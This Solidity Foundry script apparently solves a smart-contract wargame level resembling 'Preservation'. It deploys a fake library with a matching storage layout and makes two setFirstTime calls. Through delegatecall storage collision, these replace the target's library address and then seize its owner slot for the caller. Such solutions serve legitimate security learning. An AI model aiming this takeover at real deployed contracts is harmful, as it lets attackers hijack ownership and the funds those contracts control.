// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console} from "forge-std/Script.sol";

contract Solver is Script {
    address preservation = vm.envAddress("PRESERVATION_INSTANCE");

    function setUp() public {}

    function run() public {
        vm.startBroadcast(vm.envUint("PRIV_KEY"));

        FakeLibraryContract fake_library = new FakeLibraryContract();
        preservation.call(abi.encodeWithSignature("setFirstTime(uint256)", uint256(uint160(address(fake_library)))));
        preservation.call(abi.encodeWithSignature("setFirstTime(uint256)", uint256(1337)));

        vm.stopBroadcast();
    }
}

contract FakeLibraryContract {
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;
    uint256 storedTime;
    uint256 called_count;
    
    function setTime(uint256 _time) public {
        owner = address(tx.origin);
    }

}